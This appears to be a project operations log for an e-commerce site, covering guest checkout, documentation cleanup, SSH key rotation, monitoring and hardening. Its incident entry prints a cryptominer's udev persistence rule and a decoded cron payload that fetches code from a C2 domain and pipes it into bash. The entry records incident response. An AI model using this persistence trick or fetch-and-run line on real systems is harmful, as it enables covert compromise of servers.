# OPS STATE

**Last Updated**: 2026-01-16 (GUEST-CHECKOUT-01)

> **Note**: This file kept ≤250 lines. Older passes in [STATE-ARCHIVE/](STATE-ARCHIVE/).

## 2026-01-16 — Pass GUEST-CHECKOUT-01: Guest Checkout

**Status**: ✅ CLOSED

Enabled guest checkout — users can purchase without creating an account.

### Key Finding

Backend already fully supported guest checkout (Pass 52):
- `auth.optional` middleware on POST /orders
- `OrderPolicy::create()` returns `true` for `$user = null`
- `OrderEmailService` extracts email from `shipping_address`

### Changes (Frontend only)

- Guest checkout notice banner
- Email field required for guests
- Pre-fill email for logged-in users
- E2E tests for guest checkout flow

### PRs

- #2232 (feat: Pass GUEST-CHECKOUT-01 guest checkout) — merged
- #2233 (fix: E2E URL pattern for CI) — pending

---

## 2026-01-16 — Pass OPS-STATE-THIN-01: Thin STATE + Archive

**Status**: ✅ CLOSED

Reduced STATE.md from 1009 to ~250 lines. Moved older entries to archive.

### Changes

- Created `docs/OPS/STATE-ARCHIVE/` folder
- Moved entries before 2026-01-14 → `STATE-2026-Q1-EARLY.md`
- Added archive index section

### Before vs After

| Metric | Before | After |
|--------|--------|-------|
| STATE.md lines | 1009 | ~250 |
| Passes in active | All | Last 10 |
| History lost | N/A | None (archived) |

### PRs

- #TBD (docs: OPS-STATE-THIN-01 thin STATE + archive) — pending

---

## 2026-01-16 — Pass OPS-ACTIVE-01: Create ACTIVE.md Entry Point

**Status**: ✅ CLOSED

Created single entry point file to reduce agent boot time and token consumption.

### Changes

- `docs/ACTIVE.md` (new) — THE entry point (~90 lines)
- `docs/AGENT/SEEDS/boot.md` — Updated startup sequence
- `docs/AGENT/README.md` — Points to ACTIVE.md

### Before vs After

| Metric | Before | After |
|--------|--------|-------|
| Boot files | 4+ | 3 |
| Boot tokens | ~3000+ | ~800-1000 |

### PRs

- #2227 (docs: Pass OPS-ACTIVE-01 create ACTIVE.md entry point) — merged

---

## 2026-01-16 — Pass PRD-AUDIT-01: PRD→Reality Mapping

**Status**: ✅ CLOSED

Audited PRD against repository reality. Created mapping document with gaps and ordered next passes.

### Findings

| Metric | Value |
|--------|-------|
| Total Features | 111 |
| ✅ DONE | 68 (61%) |
| ⚠️ PARTIAL | 30 (27%) |
| ❌ MISSING | 13 (12%) |
| **Health Score** | **88%** |

### Critical Gaps

- Email Verification (blocked by Pass 60)
- Guest Checkout (unblocked)
- Admin User Management (unblocked)
- English Language (unblocked)

### Artifacts

- `docs/PRODUCT/PRD-AUDIT.md` — Executive summary + gap analysis
- `docs/AGENT/TASKS/Pass-PRD-AUDIT-01.md` — Task definition
- `docs/AGENT/SUMMARY/Pass-PRD-AUDIT-01.md` — Summary

### PRs

- #2225 (docs: Pass PRD-AUDIT-01 PRD→Reality mapping) — merged

---

## 2026-01-15 — Pass SEC-ROTATE-01: SSH Key Rotation

**Status**: ✅ CLOSED

Rotated SSH keys after miner incident. Old keys removed, new key installed.

### Key Status

| Key | Status |
|-----|--------|
| dixis-prod-20260115 (MekIeM...) | ✅ ACTIVE |
| dixis-main-key (Y1NzLF...) | ❌ REMOVED |
| dixis-prod-20251105 (KrAQdz...) | ❌ REMOVED |

### Verification

- NEW key login: SUCCESS
- OLD key login: Permission denied (as expected)
- SSHD: key-only, no password

### PRs

- #2219 (docs: SEC-ROTATE-01 SSH key rotation) — merged

---

## 2026-01-15 — Pass SEC-LOGWATCH-01: Local Log Monitoring

**Status**: ✅ CLOSED

Added automated local log analysis for security anomalies (no email dependency).

### Installed

| Component | Status |
|-----------|--------|
| sec-logwatch.timer (daily at 07:00 UTC) | ✅ |
| /var/log/sec-logwatch.log | ✅ |
| Admin IP whitelist (94.66.136.90, 94.66.136.115) | ✅ |

### Reports Include

- AUTH.LOG: Top 10 IPs with accepted logins, unknown IP flagging
- FAIL2BAN: Total bans, bans by jail
- NGINX ACCESS: Top 10 IPs, top 10 status codes
- NGINX ERROR: Last 20 lines

### First Run

- All accepted logins from admin IPs (260 total)
- fail2ban: 24 bans in log
- nginx: 830 200s, 59 404s (healthy)

### PRs

- #2217 (docs: SEC-LOGWATCH-01 local log monitoring) — merged

---

## 2026-01-15 — Pass SEC-EGRESS-01: Egress Monitoring + fail2ban Tightening

**Status**: ✅ CLOSED

Added egress monitoring and tightened fail2ban for enhanced security visibility.

### Installed

| Component | Status |
|-----------|--------|
| sec-egress.timer (daily at 06:00 UTC) | ✅ |
| /var/log/sec-egress.log (outbound report) | ✅ |
| fail2ban tightened (bantime=3600s, maxretry=5) | ✅ |
| Admin IP whitelisted (ignoreip) | ✅ |

### Evidence

- Baseline connections: CLEAN (nginx, next-server, admin SSH only)
- Accepted logins: ALL from admin IP via publickey
- Mining port scan: CLEAN
- Failed SSH (24h): 0

### PRs

- #2216 (docs: SEC-EGRESS-01 egress monitoring) — merged

---

## 2026-01-15 — Pass SEC-WATCH-01: Hardening Baseline + Watchdog

**Status**: ✅ CLOSED

48h post-SEC-UDEV-01 verification and hardening baseline applied.

### VPS Re-check (CLEAN)

- Load: 0.00, CPU normalized
- Stratum scan: no mining pool connections
- UDEV rules: empty (malicious rule stayed removed)
- Cron jobs: only legitimate system jobs

### Hardening Applied

| Component | Status |
|-----------|--------|
| SSHD (key-only, no password) | ✅ |
| fail2ban (sshd jail active) | ✅ |
| UFW firewall (deny incoming) | ✅ |
| nftables (block mining ports 3333/4444/5555/14444) | ✅ |
| sec-watch.timer (daily watchdog) | ✅ |

### PRs

- #2215 (docs: SEC-WATCH-01 hardening baseline) — merged

---

## 2026-01-15 — Pass TEST-COVERAGE-01: Expand @smoke Test Coverage

**Status**: ✅ CLOSED

Added 4 new `@smoke` tests for public pages (producers, contact, legal/terms, legal/privacy).

### Tests Added

| Test | Description |
|------|-------------|
| `@smoke producers page loads` | Producer listing page |
| `@smoke contact page loads` | Contact page |
| `@smoke terms page loads` | Legal terms page |
| `@smoke privacy page loads` | Legal privacy page |

### Evidence

- PR #2213 merged (all checks passed: E2E PostgreSQL, quality-gates, heavy-checks)
- Smoke test count in smoke.spec.ts: 11 → 15

### PRs

- #2213 (test: add 4 @smoke page load tests) — merged

---

## 2026-01-15 — SEC-UDEV-01: UDEV Persistence Mechanism Found & Removed

**Status**: ✅ RESOLVED

### Incident

User reported 100% CPU usage. Miner process `./90RoDF7G` (PID 6779) consuming 197% CPU since Jan 14.

### Root Cause Found

**UDEV Persistence Rule**: `/etc/udev/rules.d/99-auto-upgrade.rules`

```bash
SUBSYSTEM=="net", KERNEL!="lo", ACTION=="add", RUN+="/bin/bash -c '...recreate cron...'"
```

**Attack Flow**:
1. Every reboot/network event → udev trigger fires
2. UDEV rule recreates `/etc/cron.d/auto-upgrade`
3. Cron job (daily at midnight) downloads miner from `http://abcdefghijklmnopqrst.net`
4. Miner runs as root

**Why it kept coming back**: We deleted the cron job but not the udev rule that recreated it!

### Actions Taken

| Action | Status |
|--------|--------|
| Miner process killed (`kill -9 6779`) | ✅ |
| `/etc/cron.d/auto-upgrade` removed | ✅ |
| `/etc/udev/rules.d/99-auto-upgrade.rules` removed | ✅ **ROOT CAUSE** |
| `udevadm control --reload-rules` | ✅ |
| C2 domain blocked in `/etc/hosts` | ✅ |
| SSH access restored (AllowUsers + PermitRootLogin fix) | ✅ |

### Forensic Trail

```
# Decoded cron payload (base64)
#!/bin/bash
function __gogo() { ... uses /dev/tcp to fetch from C2 ... }
__gogo http://abcdefghijklmnopqrst.net | bash
```

### Related

- SEC-RCA-01 (2026-01-10): Suspected original vector (needs verification — see SEC-RCA-01 for details)
- Mining pools already blocked in `/etc/hosts` from previous hardening

### SSH Hardening Status

After incident, SSH was temporarily opened for access. Now restored to secure state:
- `PermitRootLogin prohibit-password` (key-only, no password)
- `PasswordAuthentication no`
- `AllowUsers deploy opsadmin root`

### Monitoring

Watch for 2-3 days. If miner returns, deeper persistence exists.

---

## 2026-01-15 — Pass TEST-UNSKIP-02: Add CI-Safe @smoke Page Load Tests

**Status**: ✅ MERGED

Added 5 new `@smoke` tests for core page loads that actually run in CI (e2e-postgres uses `--grep @smoke`).

### Why

Previous TEST-UNSKIP-02 (PR #1964) unskipped tests that were "false-green" — they appeared to pass but never actually ran in CI because they lacked the `@smoke` tag.

### Tests Added

| Test | Description |
|------|-------------|
| `@smoke PDP page loads` | Product detail page (200 or 404 gracefully) |
| `@smoke cart page loads` | Cart page renders body |
| `@smoke login page loads` | Login page (200/302/307) |
| `@smoke register page loads` | Register page (200/302/307) |
| `@smoke home page loads` | Home page renders nav/main |

### PRs

- #2206 (test: add 5 @smoke page load tests) — merged

---

## 2026-01-14 — Pass OPS-CANONICAL-PATHS-01: Canonical Prod Paths in Deploy Workflows

**Status**: ✅ MERGED (backend OK, frontend blocked by missing env var)

Fixed deploy workflows to use canonical prod paths: `/var/www/dixis/current/{frontend,backend}` instead of legacy paths.

### Decision

**Canonical prod root is `/var/www/dixis/current/`** — All deploy workflows now check:
- Frontend: `/var/www/dixis/current/frontend/.env`
- Backend: `/var/www/dixis/current/backend/`

### Deploy Results

| Workflow | Status | Notes |
|----------|--------|-------|
| deploy-backend | ✅ PASS | https://github.com/lomendor/Project-Dixis/actions/runs/21012280130 |
| deploy-frontend | ❌ BLOCKED | Path fix works; missing `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` in VPS |

### Prod Sanity (all pass)
- `https://dixis.gr/` → 200 OK
- `/api/v1/public/products` → 200 OK, JSON
- `/api/auth/request-otp` → 200 OK, success

### PRs
- #2201 (fix: use canonical paths) — merged

### Next Steps
Add `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` to `/var/www/dixis/current/frontend/.env` on VPS to unblock frontend deploys.

---

## 2026-01-14 — Pass OPS-VERIFY-01: Deploy Verification Proof Standard

**Status**: ✅ MERGED

Established curl-based deploy verification standard. Removed sudo commands from deploy workflow since `deploy` user lacks passwordless sudo.

### Decision

**No sudo in deploy verify** — All post-deploy checks use curl-based proofs:
1. Port listener check: `curl -s http://127.0.0.1:3000/`
2. Health endpoint: `/api/healthz`
3. OPS-PM2-01 20x curl stability proof

### PRs
- #2195 (fix: remove sudo from deploy verify) — merged
- #2197 (docs: deploy verification proof standard) — merged

### Documentation
- `docs/OPS/DEPLOY-VERIFY-PROOF.md` — Canonical verification standard

---

## Archive

Older entries moved to archive for faster agent boot.

| Archive | Period | Link |
|---------|--------|------|
| 2026 Q1 (Early) | Jan 4-12 | [STATE-2026-Q1-EARLY.md](STATE-ARCHIVE/STATE-2026-Q1-EARLY.md) |

See [STATE-ARCHIVE/INDEX.md](STATE-ARCHIVE/INDEX.md) for full list.
